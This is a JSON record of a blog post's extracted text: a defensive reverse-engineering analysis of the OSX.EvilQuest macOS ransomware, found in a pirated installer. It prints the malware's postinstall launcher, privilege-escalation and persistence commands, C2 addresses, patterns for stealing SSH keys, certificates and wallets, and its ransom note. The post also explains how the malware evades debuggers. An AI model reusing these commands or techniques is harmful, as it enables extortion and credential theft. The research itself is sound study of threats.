{
    "id": "e27d90ba-a965-4555-91f9-4e822a566aed",
    "created_at": "2023-01-12T15:01:17.705777Z",
    "updated_at": "2025-03-27T02:16:25.652229Z",
    "deleted_at": null,
    "sha1_hash": "3e57afb6d690dbc1de6e3931f054cc513e428f5c",
    "title": "2020-06-29 - OSX.EvilQuest Uncovered",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:23Z",
    "file_modification_date": "2022-05-29T01:23:23Z",
    "file_size": 3992542,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x59.html**\n\n### OSX.EvilQuest Uncovered\n\n part i: infection, persistence, and more!\n\n by: Patrick Wardle / June 29, 2020\n\n Our research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n Airo AV\n\n Become a Friend! üìù üëæ Want to play along? I‚Äôve added the sample (‚ÄòOSX.EvilQuest‚Äô) to our malware collection (password: infect3d)\n\n ‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\n### Early today, the noted Malware researcher Dinesh Devadoss tweeted about a new piece of macOS malware with ransomware tendencies ‚Äúimpersonating as Google Software Update program with zero detection.‚Äù:\n\n\n-----\n\n### #macOS #ransomware impersonating as Google Software Update program with zero detection.\n MD5: 522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD@philofishal @patrickwardle @thomasareed pic.twitter.com/r5tkmfzmFT\n\n ‚Äî Dinesh_Devadoss (@dineshdina04) June 29, 2020\n\n It‚Äôs not everyday that a new piece of malware/ransomware is uncovered that targets macOS. Moreover, as my RansomWhere? tool claims to be able to generically detect such threats, I decided to take a anlayze the malware and confirm the tool does indeed detect it (with no a priori knowledge).\n\n In this first part of this two-part blog post series, we‚Äôll discuss the malware‚Äôs infection vector, and perform an initial triage to uncover its persistence, and anti-analysis logic. In part two, we‚Äôll detect the capabilities of this insidious threat.\n\n## Infection Vector\n\n### From Dinesh‚Äôs tweet, it was not apparent how the ransomware was able to infect macOS users. However, Thomas Reed of Malwarebytes (and Objective by the Sea speaker!), noted that the malware had been found in pirated versions of popular macOS software, shared on popular torrent sites.\n\n This method of infection, though relatively unsophisticated is somewhat common, thus indicating it is (at least at some level) successful. Other examples of macOS malware spreading via infected torrents include:\n\n OSX.iWorm:\n\n OSX.Shlayer:\n\n\n-----\n\n### Intego researchers found OSX/Shlayer spreading via BitTorrent file sharing sites, appearing as a fake Flash Player update when a user attempts to select a link to copy a torrent magnet link.‚Äù\n\n Ethical reasons aside, it's generally unwise to install pirated software, as it is often infected with malware. ‚ÄúTorrent sites are notorious for distributing malware and adware, sometimes through misleading advertisements, and sometimes through Trojan horse downloads that claim to be ‚Äòcracks‚Äô or that may contain infected copies of legitimate software‚Äù -Intego\n\n The sample we‚Äôll be analyzing today, is packaged in a (pirated?) version of the popular DJ software Mixed In Key. The malicious package is unsigned:\n\n ‚Ä¶meaning macOS will prompt the user before allowing it to be opened:\n\n\n-----\n\n### However, macOS users attempting to pirate software may likely ignore this warning, pressing onwards ensuring infection commences.\n\n## Analysis\n\n### As noted, the ransomware is distributed via trojanzied installers. The sample we‚Äôll dive into, is distributed via a disk image named Mixed In Key 8.dmg ( SHA1:\n```\n98040c4d358a6fb9fed970df283a9b25f0ab393b ).\n\n Currently this disk image is not flagged by any of the anti-virus engines on VirusTotal, (though this is likely to change as AV engines update their signature databases):\n\n We can mount this disk image, via the hdiutil utility:\n$ hdiutil attach ~/Downloads/Mixed\\ In\\ Key\\ 8.dmg \n/dev/disk2      GUID_partition_scheme      \n/dev/disk2s1     Apple_APFS           \n/dev/disk3      EF57347C-0000-11AA-AA11-0030654 \n/dev/disk3s1     41504653-0000-11AA-AA11-0030654 /Volumes/Mixed In Key 8\n\n The mounted disk image (‚Äô/Volumes/Mixed In Key 8/‚Äô) contains a installer package Mixed\nIn Key 8.pkg :\n$ ls /Volumes/Mixed\\ In\\ Key\\ 8/\nMixed In Key 8.pkg\n\n My favorite tool for statically analyzing (and extracting files from) a package is Suspicious\nPackage:\n\n```\n\n-----\n\n### Once opened in Suspicious Package, we find the (pirated?) Mixed In Key 8 application and binary named ‚Äú patch ‚Äù:\n\n Clicking on the ‚Äòpostinstall‚Äô tab, we find a post install script:\n```\n1#!/bin/sh\n2mkdir /Library/mixednkey\n3\n4mv /Applications/Utils/patch /Library/mixednkey/toolroomd\n5rmdir /Application/Utils\n6\n7chmod +x /Library/mixednkey/toolroomd\n8\n9/Library/mixednkey/toolroomd &\n\n In short, after creating the /Library/mixednkey directory, it moves a binary named\npatch into this directory, sets it to be executable, and launches it.\n\n As the installer requests root privileges during the install, this script (and thus the\ntoolroomd binary) will also run with root privileges:\n\n```\n\n-----\n\n### Via dynamic analysis monitoring tools (such as a file and process monitor) we can passively observe the installation process:\n```\n# procInfo \n[process start]\npid: 536\npath: /bin/sh\nuser: 0\nargs: (\n  \"/bin/sh\",\n\"/tmp/PKInstallSandbox.NY2QC8/Scripts/com.mixedinkey.installer.mCoJoP/postinstall\",\n  \"/Users/user/Downloads/Mixed In Key 8.pkg\",\n  \"/Applications\",\n  \"/\",\n  \"/\"\n)\n...\n# fs_usage -w -f filesystem\nmkdir   /Library/mixednkey mkdir.5164\n...\nrename  /Applications/Utils/patch mv.5167\n...\nfstatat64 /Library/mixednkey/toolroomd chmod.5171\n\n```\n\n-----\n\n### Using Suspicious Package we can extract both the Mixed In Key 8 application and the binary named ‚Äú patch . As the Mixed In Key 8 binary is (still) validly signed by the\n```\nMixed In Key developers, it is likely pristine and unmodified:\n\n ‚Ä¶as such, we turn our attention to the toolroomd binary.\n\n The toolroomd binary (originally called patch ) is a 64-bit unsigned Mach-O executable:\n$ file patch\npatch: Mach-O 64-bit executable x86_64\n$ codesign -dvv patch \npatch: code object is not signed at all\n$ shasum -a1 patch\nefbb681a61967e6f5a811f8649ec26efe16f50ae patch\n\n Next, we run the strings command:\n\n```\n\n-----\n\n```\n$ string patch\n2Uy5DI3hMp7o0cq|T|14vHRz0000013\n0ZPKhq0rEeUJ0GhPle1joWN30000033\n0rzACG3Wr||n1dHnZL17MbWe0000013\nsystem.privilege.admin\n%s --reroot\n--silent\n--noroot\n--ignrp\n_generate_xkey\n/toidievitceffe/libtpyrc/tpyrc.c\nbits <= 1024\n_get_process_list\n/toidievitceffe/libpersist/persist.c\n[return]\n[tab]\n[del]\n[esc]\n[right-cmd]\n[left-cmd]\n[left-shift]\n[caps]\n[left-option]\n\n### From the strings output, we find obfuscated strings, plus some that appear related to command line arguments, file encryption, and perhaps keylogging(?).\n\n Via the nm utility, we can dump the names of symbols (including function names):\n\n```\n\n-----\n\n```\n$ nm patch\n         U _CGEventGetIntegerValueField\n         U _CGEventTapCreate\n         U _CGEventTapEnable\n         U _NSAddressOfSymbol\n         U _NSCreateObjectFileImageFromMemory\n         U _NSDestroyObjectFileImage\n         U _NSLinkModule\n         U _NSLookupSymbolInModule\n         U _NSUnLinkModule\n         U _NXFindBestFatArch\n0000000100002900 T __construct_plist_path\n000000010000a7e0 T __dispatch\n0000000100009c20 T __ei_init_crc32_tab\n000000010000b490 T __ei_rootgainer_elevate\n00000001000061c0 T __generate_xkey\n000000010000a550 T __get_host_identifier\n0000000100007c40 T __get_process_list\n00000001000094d0 T __home_stub\n000000010000e0c0 T __is_target\n000000010000ecb0 T __make_temp_name\n0000000100000000 T __mh_execute_header\n0000000100004910 T __pack_trailer\n000000010000a170 T __react_exec\n000000010000a160 T __react_host\n000000010000a470 T __react_keys\n000000010000a500 T __react_ping\n000000010000a300 T __react_save\n0000000100009e80 T __react_scmd\n000000010000a460 T __react_start\n00000001000072d0 T __rotate\n00000001000068a0 T __tp_decrypt\n0000000100006610 T __tp_encrypt\n00000001000049c0 T __unpack_trailer\n0000000100002550 T _acquire_root\n         U _connect\n00000001000085a0 T _create_rescue_executable\n000000010000ba50 T _ei_carver_main\n0000000100001590 T _ei_forensic_sendfile\n0000000100001680 T _ei_forensic_thread\n0000000100005b00 T _ei_get_host_info\n0000000100006050 T _ei_get_macaddr\n000000010000b9b0 T _ei_loader_main\n000000010000c9a0 T _ei_loader_thread\n0000000100009650 T _ei_pers_thread\n000000010000b880 T _ei_persistence_main\n0000000100001c30 T _ei_read_spot\n000000010000b580 T _ei_rootgainer_main\n0000000100003670 T _ei_run_file\n0000000100003790 T _ei_run_memory_hrd\n0000000100009550 T _ei_run_thread\n0000000100001a10 T _ei_save_spot\n\n```\n\n-----\n\n```\n000000010000b710 T _ei_selfretain_main\n000000010000de60 T _eib_decode\n000000010000dd40 T _eib_encode\n000000010000dc40 T _eib_pack_c\n000000010000e010 T _eib_secure_decode\n000000010000dfa0 T _eib_secure_encode\n0000000100013660 D _eib_string_fa\n0000000100013708 S _eib_string_key\n000000010000dcb0 T _eib_unpack_i\n0000000100007570 T _eip_decrypt\n0000000100007310 T _eip_encrypt\n0000000100007130 T _eip_key\n00000001000071f0 T _eip_seeds\n0000000100007aa0 T _is_debugging\n0000000100007bc0 T _is_virtual_mchn\n0000000100002dd0 T _lfsc_dirlist\n00000001000032c0 T _lfsc_get_contents\n000000010000fa50 T _lfsc_match\n00000001000033e0 T _lfsc_pack_binary\n000000010000f720 T _lfsc_parse_template\n0000000100003500 T _lfsc_unpack_binary\n0000000100008810 T _persist_executable\n0000000100008df0 T _persist_executable_frombundle\n         U _popen\n0000000100007c20 T _prevent_trace\n\n### Ohh, the plot thickens! From this nm output, we seen methods and function names related to:\n\n keylogging? _CGEventTapCreate, _CGEventTapEnable, etc.\n\n in-memory code execution? _NSCreateObjectFileImageFromMemory,\n   _NSLinkModule, etc.\n\n anti-analysis? _is_debugging, _is_virtual_mchn\n\n survey? __get_host_identifier, __get_process_list, etc.\n\n persistence _persist_executable, _persist_executable_frombundle\n\n encryption (ransom) _eip_encrypt\n\n ‚Ä¶seems more than ‚Äújust‚Äù a simple piece of ransomware!\n\n```\n\n-----\n\n### Time to disassemble/debug the patch binary\n\n The core logic of the patch (or toolroomd ) binary occurs within it‚Äôs main function.\n\n First, it parses any commandline parameters looking for --silent, --noroot, and -```\nignrp .\n   --silent\n\n If --silent is passed in via the command line, it sets a value to zero. This appears to instruct the malware to run ‚Äúsilently‚Äù, for example suppressing the printing out error messages.\n   1__text:000000010000C375 cmp   [rbp+silent], 1\n   2__text:000000010000C379 jnz   skipErrMsg\n   3...\n   4__text:000000010000C389 lea   rdi, \"This application has to be run by root\"\n   5__text:000000010000C396 call  _printf\n\n This flag is passed to the ei_rootgainer_main function, which influences how the malware (running as a normal user) may request root privileges:\n   1__text:000000010000C2EB  lea   rdx, [rbp+silent]\n   2__text:000000010000C2EF  lea   rcx, [rbp+var_34]\n   3__text:000000010000C2F3  call  _ei_rootgainer_main\n\n Interestingly this flag is explicitly initialized to zero, an set to zero again if the -   silent is specified, though appears to never be set to 1. Thus the malware will alway\n\n run in ‚Äúsilent‚Äù mode, even if --silent is not specified. ÔøΩ\n   --noroot\n\n If --noroot is passed in via the command line, it sets a value to one. Various code within the malware then checks this flag, and if set (to 1) takes different action ‚Ä¶for example skipping the request for root privileges:\n   1__text:000000010000C2D6         cmp   [rbp+noRoot], 0\n   2__text:000000010000C2DA         jnz   noRequestForRoot\n   3...\n   4__text:000000010000C2F3         call  _ei_rootgainer_main\n\n This flag is also passed to a persistence function, to influence how the malware is persisted (as a launch daemon, or a launch agent):\n   1__text:000000010000C094         mov   ecx, [rbp+noRoot]\n   2__text:000000010000C097         mov   r8d, [rbp+var_24]\n   3__text:000000010000C09B         call  _ei_persistence_main\n\n```\n\n-----\n\n```\n   --ignrp\n\n### If --ignrp is passed in via the command line, it sets a value to one, and instructs the malware not to persist (‚Äúignore persistence‚Äù).\n\n For example in the ei_selfretain_main function (that persists the malware), this flag is checked. If it‚Äôs not set, the function simply returns without persisting the malware:\n   1__text:000000010000B786         cmp   [rbp+ignorePersistence], 0\n   2__text:000000010000B78A         jz   leave\n\n Once the malware has parse its command line options, it executes a function named\nis_virtual_mchn, and exits if it returns true:\n1if(is_virtual_mchn(0x2) != 0x0) {\n2  exit();\n3}\n\n Let‚Äôs take a closer look at this function, as we want to make sure it doesn‚Äôt detect our debugging session in a virtual machine:\n 1int _is_virtual_mchn(int arg0) {\n 2  var_10 = time();\n 3  sleep(argO);\n 4  rax = time();\n 5  rdx = 0x0;\n 6  if (rax - var_10 < arg0) {\n 7      rdx = 0x1;\n 8  }\n 9  rax = rdx;\n10  return rax;\n11}\n\n This code invokes time twice, with a sleep in between ‚Ä¶then compares if the differences between the two calls to time match the amount of time that was system slept for. Why? To detect sandboxes that patch (speedup) calls to sleep :\n\n ‚ÄúSleep Patching Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.‚Äù -www.isaca.org\n\n This means, that in reality the function is more of sandbox check, and may not detect a virtual machine. That‚Äôs good news for our debugging efforts!\n\n```\n\n-----\n\n### Continuing on, the malware invokes a method named extract_ei, which attempts to read 0x20 bytes of ‚Äútrailer‚Äù data from within (the end?) of itself. However, as a function named\n```\nunpack_trailer (invoked by extract_ei ) returns 0 ( false ) as a check for\n0DEADFACEh fails, it appears that this sample does not contain the required ‚Äútrailer‚Äù data:\n1;rcx: trailer data\n2__text:0000000100004A39         cmp   dword ptr [rcx+8], 0DEADFACEh\n3__text:0000000100004A40         mov   [rbp+var_38], rax\n4__text:0000000100004A44         jz   leave\n\n With no trailer data found, the sample skips certain persistence logic ‚Ä¶logic that appears to persist a daemon:\n 1;rcx: trailer data\n 2if (extract_ei(*var_10, &var_40) != 0x0) {\n 3  _persist_executable_frombundle(var_48, var_40, var_30, *var_10);\n 4  _install_daemon(var_30, _ei_str(\"0hC|h71FgtPJ32afft3EzOyU3xFA7q0{LBx...\"), \n 5          _ei_str(\"0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD...\"), 0x1);\n 6\n 7  var_50 = _ei_str(\"0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD1m6d3j0000073\");\n 8  var_58 = _ei_str(\"20HBC332gdTh2WTNhS2CgFnL2WBs2l26jxCi0000013\");\n 9  var_60 = _ei_str(\"1PbP8y2Bxfxk0000013\");\n10  ...\n11  _run_daemon_u(var_50, var_58, var_60);\n12  ...\n13  _run_target(*var_10);\n14}\n\n It appears that various values of interest to us (such as the name/path of the daemon) are obfuscated. However, looks like the _ei_str function is responsible for the deobfuscation:\n\n Looking at its decompilation, we see a one-time initialization of a variable named\n_eib_string_key and then a call into a function named _eib_secure_decode (which\n\n calls a method named _tpdcrypt ):\n\n```\n\n-----\n\n```\n 1int _ei_str(int arg0) {\n 2  var_10 = arg0;\n 3  if (*_eib_string_key == 0x0) {\n 4      *_eib_string_key = _eip_decrypt(_eib_string_fa, 0x6b8b4567);\n 5  }\n 6  var_18 = 0x0;\n 7  rax = strlen();\n 8  rax = _eib_secure_decode(var_10, rax, *_eib_string_key, &var_18);\n 9  var_20 = rax;\n10  if (var_20 == 0x0) {\n11      var_8 = var_10;\n12  }\n13  else {\n14      var_8 = var_20;\n15  }\n16  rax = var_8;\n17  return rax;\n18}\n\n### Generally, we don‚Äôt have to concern ourselves with the details of the deobfuscation (or decryption) algorithm, as we can simply set a debugger breakpoint at the end of the function, and print out the (now) plaintext string (which is held in the RAX register).\n\n But let‚Äôs at least dump the decryption key ( _eib_string_key ):\n(lldb) x/s $rdx\n0x1001004c0: \"PPK76!dfa82^g\"\n\n However, the ‚Äúdownside‚Äù to this approach is that we‚Äôll only decrypt strings when the malware invokes the ei_str function (and our debugger breakpoint is hit). Thus, if an encrypted string is (only) referenced in blocks of code that aren‚Äôt executed, we won‚Äôt ever see it‚Äôs decrypted value. Of course we want to decrypt all the strings!\n\n We know the malware can (obviously) decrypt all its strings (via the ei_str function), we just need a way to ‚Äúconvince‚Äù to do so! Turns out this isn‚Äôt too hard. We simply create an injectable dynamic library that resolves the address of the malware‚Äôs ei_str function, then invokes it for any/all encrypted strings! As we place all the logic in the constructor of the dynamic library, it is automatically executed when the library is loaded, before the malware‚Äôs code is even run!\n\n Here‚Äôs the (well-commented) code from the injectable dynamic library:\n\n```\n\n-----\n\n```\n 1__attribute__((constructor)) static void decrypt()\n 2{\n 3 //define & resolve the malware's `ei_str` function\n 4 typedef char* (*ei_str)(char* str);\n 5 ei_str ei_strFP = dlsym(RTLD_MAIN_ONLY, \"ei_str\");\n 6\n 7\n 8 //init pointers\n 9 // the `__cstring` segment starts `0xF98D` after `ei_str` and is `0x29E9` long\n10 char* start = (char*)ei_strFP + 0xF98D;\n11 char* end = start + 0x29E9;\n12 char* current = start;\n13\n14 //decrypt all stings!\n15 while(current < end)\n16 {\n17  //decrypt\n18  char* string = ei_strFP(current);\n19  printf(\"decrypted string (%#lx): %s\\n\", (unsigned long)current, string);\n20    \n21  //next\n22  current += strlen(current);\n23 }\n24}\n\n### In short, it simply scan over the entire __cstring segment (which contains all the encrypted strings), invoking the ei_str method on each encrypted string.\n\n We compile and forcefully load this into the malware via the DYLD_INSERT_LIBRARIES environment variable. Once loaded our decryption logic is invokes and the coerces the malware to decrypt all it‚Äôs strings:\n\n```\n\n-----\n\n```\nDYLD_INSERT_LIBRARIES /tmp/libEvilQuestDecryptor.dylib /Library/mixednkey/toolroomd \ndecrypted string (0x10eb675ec): andrewka6.pythonanywhere.com\ndecrypted string (0x10eb67624): ret.txt\ndecrypted string (0x10eb6764a): osascript -e \"beep 18\nsay \\\"%s\\\" waiting until completion false\nset alTitle to \\\"%s\\\"\nset alText to \\\"%s\\\"\ndisplay alert alText message alTitle as critical buttons {\\\"OK\\\"}\nset the clipboard to \\\"%s\\\"\"\ndecrypted string (0x10eb6778c): READ_ME_NOW.txt\ndecrypted string (0x10eb677b8): %s/Desktop/%s\ndecrypted string (0x10eb677d8): %s/Documents/%s\ndecrypted string (0x10eb67804): %s/Pictures/%s\ndecrypted string (0x10eb67824): %s/Movies/%s\ndecrypted string (0x10eb67844): %s/Hellper.app\ndecrypted string (0x10eb67864): osascript -e \"do shell script \\\"sudo %s\\\" with\nadministrator privileges\"\ndecrypted string (0x10eb678e4): system.privilege.admin\ndecrypted string (0x10eb678fb): %s --reroot\ndecrypted string (0x10eb67907): launchctl submit -l 'questd' -p '%s'\ndecrypted string (0x10eb6794c): --silent\ndecrypted string (0x10eb67960): osascript -e \"do shell script \\\"launchctl load -w\n%s;launchctl start %s\\\" with administrator privileges\"\ndecrypted string (0x10eb67a10): osascript -e \"do shell script \\\"launchctl load -w\n%s;launchctl start %s\\\"\"\ndecrypted string (0x10eb67a95): *id_rsa*/i\ndecrypted string (0x10eb67ab5): *.pem/i\ndecrypted string (0x10eb67ad5): *.ppk/i\ndecrypted string (0x10eb67af5): known_hosts/i\ndecrypted string (0x10eb67b15): *.ca-bundle/i\ndecrypted string (0x10eb67b35): *.crt/i\ndecrypted string (0x10eb67b55): *.p7!/i\ndecrypted string (0x10eb67b75): *.!er/i\ndecrypted string (0x10eb67b95): *.pfx/i\ndecrypted string (0x10eb67bb5): *.p12/i\ndecrypted string (0x10eb67bd5): *key*.pdf/i\ndecrypted string (0x10eb67bf5): *wallet*.pdf/i\ndecrypted string (0x10eb67c15): *key*.png/i\ndecrypted string (0x10eb67c35): *wallet*.png/i\ndecrypted string (0x10eb67c55): *key*.jpg/i\ndecrypted string (0x10eb67c75): *wallet*.jpg/i\ndecrypted string (0x10eb67c95): *key*.jpeg/i\ndecrypted string (0x10eb67cb5): *wallet*.jpeg/i\ndecrypted string (0x10eb67ce6): HelloCruelWorld\ndecrypted string (0x10eb67d12): [Memory Based Bundle]\ndecrypted string (0x10eb67d6b): ei_run_memory_hrd\ndecrypted string (0x10eb681ad): \n\n```\n\n-----\n\n```\n<!DOCTYPE plist PUBLIC //Apple//DTD PLIST 1.0//EN \n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>%s</string>\n<key>ProgramArguments</key>\n<array>\n<string>sudo</string>\n<string>%s</string>\n<string>--silent</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n<key>KeepAlive</key>\n<true/>\n</dict>\n</plist>\ndecrypted string (0x10eb68419): wb+\ndecrypted string (0x10eb6841d): %s/Library/\ndecrypted string (0x10eb6843f): /Library/AppQuest/com.apple.questd\ndecrypted string (0x10eb68483): /Library/AppQuest\ndecrypted string (0x10eb684af): %s/Library/AppQuest\ndecrypted string (0x10eb684db): %s/Library/AppQuest/com.apple.questd\ndecrypted string (0x10eb6851f): \n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>%s</string>\n<key>ProgramArguments</key>\n<array>\n<string>%s</string>\n<string>--silent</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n<key>KeepAlive</key>\n<true/>\n</dict>\n</plist>\ndecrypted string (0x10eb68767): questd\ndecrypted string (0x10eb6877b): com.apple.questd.plist\ndecrypted string (0x10eb687a7): /Library/LaunchDaemons/\n\n```\n\n-----\n\n```\ndecrypted string (0x10eb687df): %s/Library/LaunchAgents/\ndecrypted string (0x10eb68817): NCUCKOO7614S\ndecrypted string (0x10eb68837): 167.71.237.219\ndecrypted string (0x10eb68857): q?s=%s&h=%s\ndecrypted string (0x10eb68863): .xookc\ndecrypted string (0x10eb68877): osascript -e \"do shell script \\\"sudo open %s\\\" with\nadministrator privileges\"\ndecrypted string (0x10eb688f7): Hi there\ndecrypted string (0x10eb6891b): .shcsh\ndecrypted string (0x10eb6893f): Little Snitch\ndecrypted string (0x10eb6895f): Kaspersky\ndecrypted string (0x10eb6897f): Norton\ndecrypted string (0x10eb68993): Avast\ndecrypted string (0x10eb689a7): DrWeb\ndecrypted string (0x10eb689bb): Mcaffee\ndecrypted string (0x10eb689db): Bitdefender\ndecrypted string (0x10eb689fb): Bullguard\ndecrypted string (0x10eb68a1b): com.apple.questd\ndecrypted string (0x10eb68a47): ookcucythguan\ndecrypted string (0x10eb68a67): Installer.app\ndecrypted string (0x10eb68a87): Setup\ndecrypted string (0x10eb68a9b): %s --ignrp\ndecrypted string (0x10eb68aa6): /Users\ndecrypted string (0x10eb68aba): --noroot\ndecrypted string (0x10eb68ac3): --ignrp\ndecrypted string (0x10eb68acb): %s/.ncspot\ndecrypted string (0x10eb68aeb): H2QGjSmA\ndecrypted string (0x10eb68b54): YOUR IMPORTANT FILES ARE ENCRYPTED\nMany of your documents, photos, videos, images and other files are no longer\naccessible because they have been encrypted. Maybe you are busy looking for a way to\nrecover your files, but do not waste your time. Nobody can recover your file without\nour decryption service.\nWe use 256-bit AES algorithm so it will take you more than a billion years to break\nthis encryption without knowing the key (you can read Wikipedia about AES if you\ndon't believe this statement).\nAnyways, we guarantee that you can recover your files safely and easily. This will\nrequire us to use some processing power, electricity and storage on our side, so\nthere's a fixed processing fee of 50 USD. This is a one-time payment, no additional\nfees included.\nIn order to accept this offer, you have to deposit payment within 72 hours (3 days)\nafter receiving this message, otherwise this offer will expire and you will lose your\nfiles forever.\nPayment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the\nmoment of payment. The address you have to make payment is:\n          %s\nDecryption will start automatically within 2 hours after the payment has been\nprocessed and will take from 2 to 5 hours depending on the processing power of your\ncomputer. After that all of your files will be restored.\n\n```\n\n-----\n\n```\nTHIS OFFER IS VALID FOR 72 HOURS AFTER RECEIVING THIS MESSAGE\ndecrypted string (0x10eb6939c): 13roGMpWd7Pb3ZoJyce8eoQpfegQvGHHK7\ndecrypted string (0x10eb693bf): Your files are encrypted\ndecrypted string (0x10eb693f7): Many of your important documents, photos, videos,\nimages and other files are no longer accessible because they have been encrypted.\nMaybe you are busy looking for a way to recover your files, but do not waste your\ntime. Nobody can recover your files without our decryption service.\nWe guarantee however that you can recover your files safely and easily and this will\ncost you 50 USD without any additional fees.\nOur offer is valid FOR 3 DAYS (starting now!). Full details can be found in the file:\nREAD_ME_NOW.txt located on your Desktop\ndecrypted string (0x10eb6997e): READ_ME_NOW\ndecrypted string (0x10eb6999e): .tar\ndecrypted string (0x10eb699b2): .rar\ndecrypted string (0x10eb699c6): .tgz\ndecrypted string (0x10eb699da): .zip\ndecrypted string (0x10eb699ee): .7z\ndecrypted string (0x10eb69a02): .dmg\ndecrypted string (0x10eb69a16): .gz\ndecrypted string (0x10eb69a2a): .jpg\ndecrypted string (0x10eb69a3e): .jpeg\ndecrypted string (0x10eb69a52): .png\ndecrypted string (0x10eb69a66): .gif\ndecrypted string (0x10eb69a7a): .psd\ndecrypted string (0x10eb69a8e): .eps\ndecrypted string (0x10eb69aa2): .mp4\ndecrypted string (0x10eb69ab6): .mp3\ndecrypted string (0x10eb69aca): .mov\ndecrypted string (0x10eb69ade): .avi\ndecrypted string (0x10eb69af2): .mkv\ndecrypted string (0x10eb69b06): .wav\ndecrypted string (0x10eb69b1a): .aif\ndecrypted string (0x10eb69b2e): .aiff\ndecrypted string (0x10eb69b42): .ogg\ndecrypted string (0x10eb69b56): .flac\ndecrypted string (0x10eb69b6a): .doc\ndecrypted string (0x10eb69b7e): .txt\ndecrypted string (0x10eb69b92): .docx\ndecrypted string (0x10eb69ba6): .xls\ndecrypted string (0x10eb69bba): .xlsx\ndecrypted string (0x10eb69bce): .pages\ndecrypted string (0x10eb69be2): .pdf\ndecrypted string (0x10eb69bf6): .rtf\ndecrypted string (0x10eb69c0a): .m4a\ndecrypted string (0x10eb69c1e): .csv\ndecrypted string (0x10eb69c32): .djvu\ndecrypted string (0x10eb69c46): .epub\ndecrypted string (0x10eb69c5a): .pub\ndecrypted string (0x10eb69c6e): .key\ndecrypted string (0x10eb69c82): .dwg\ndecrypted string (0x10eb69c96): .c\n\n```\n\n-----\n\n```\ndecrypted string (0x10eb69caa): .cpp\ndecrypted string (0x10eb69cbe): .h\ndecrypted string (0x10eb69cd2): .m\ndecrypted string (0x10eb69ce6): .php\ndecrypted string (0x10eb69cfa): .cgi\ndecrypted string (0x10eb69d0e): .css\ndecrypted string (0x10eb69d22): .scss\ndecrypted string (0x10eb69d36): .sass\ndecrypted string (0x10eb69d4a): .otf\ndecrypted string (0x10eb69d5e): .ttf\ndecrypted string (0x10eb69d72): .asc\ndecrypted string (0x10eb69d86): .cs\ndecrypted string (0x10eb69d9a): .vb\ndecrypted string (0x10eb69dae): .asp\ndecrypted string (0x10eb69dc2): .ppk\ndecrypted string (0x10eb69dd6): .crt\ndecrypted string (0x10eb69dea): .p7\ndecrypted string (0x10eb69dfe): .pfx\ndecrypted string (0x10eb69e12): .p12\ndecrypted string (0x10eb69e26): .dat\ndecrypted string (0x10eb69e3a): .hpp\ndecrypted string (0x10eb69e4e): .ovpn\ndecrypted string (0x10eb69e62): .download\ndecrypted string (0x10eb69e82): .pem\ndecrypted string (0x10eb69e96): .numbers\ndecrypted string (0x10eb69eb6): .keynote\ndecrypted string (0x10eb69ed6): .ppt\ndecrypted string (0x10eb69eea): .aspx\ndecrypted string (0x10eb69efe): .html\ndecrypted string (0x10eb69f12): .xml\ndecrypted string (0x10eb69f26): .json\ndecrypted string (0x10eb69f3a): .js\ndecrypted string (0x10eb69f4e): .sqlite\ndecrypted string (0x10eb69f6e): .pptx\ndecrypted string (0x10eb69f82): .pkg\n\n### In the decrypted output we find many revealing strings that appear to be:\n\n addresses of (command and control?) servers: andrewka6.pythonanywhere.com,\n   167.71.237.219 .\n\n regexes for files of interest, relating to keys, certificates, and wallets: *id_rsa*/i,\n   *key*.pdf/i, *wallet*.pdf, etc‚Ä¶\n\n property list file(s) for launch item persistence. security products: Little Snitch, Kaspersky, etc‚Ä¶ (de)ransom instructions, and target file extensions.\n\n Scott Knight (@sdotknight) has a created a lovely python script capable of decrypting strings (and other components) of OSX.EvilQuest.\n\n thiefquest_decrypt.py\n\n```\n\n-----\n\n### Continuing on in our analysis, as this specimen does not appear to contain any trailer data, the code block (mentioned above) is skipped ‚Ä¶however, the malware then invokes a function named ei_persistence_main which (also) persists the malware.\n\n However, before persistence, the ei_persistence_main function invokes various anti- debugging logic, in an attempt to thwart dynamic debugging! Specifically it first calls a function named is_debugging . The is_debugging method is implemented at address\n```\n0x0000000100007AA0 . To check if it is being debugged, it invokes sysctl with\nCTL_KERN, KERN_PROC, KERN_PROC_PID, and getpid() . Once this has returned, it\n\n checks if the P_TRACED is set (in the info.kp_pro structure returned by sysctl ). This is a common anti-debugger check, seen in other macOS malware:\n\n If the is_debugging function returns 1 ( true ) the malware will exit:\n1__text:000000010000B89A         call  _is_debugging\n2__text:000000010000B89F         cmp   eax, 0\n3__text:000000010000B8A2         jz   continue\n4__text:000000010000B8A8         mov   edi, 1\n5__text:000000010000B8AD         call  _exit\n\n To subvert this in a debugger we simply set a breakpoint at 0x000000010000B89F, then change the value of the RAX register to 0 ( false ):\n\n```\n\n-----\n\n```\n thread #1, queue com.apple.main thread, stop reason breakpoint 1.1\n-> 0x10000b89f: cmpl  $0x0, %eax\n  0x10000b8a2: je   0x10000b8b2\n  0x10000b8a8: movl  $0x1, %edi\n  0x10000b8ad: callq 0x10000feb2\nTarget 0: (patch) stopped.\n(lldb) reg read $rax\n   rax = 0x0000000000000001\n(lldb) reg write $rax 0\n(lldb) c\n\n### All good? Almost! The malware contains more anti-debugging logic. A function called\nprevent_trace seeks to prevent tracing (debugging) via call to ptrace with the\nPTRACE_DENY_ATTACH flag ( 0x1F ):\n 1__text:0000000100007C20 _prevent_trace proc 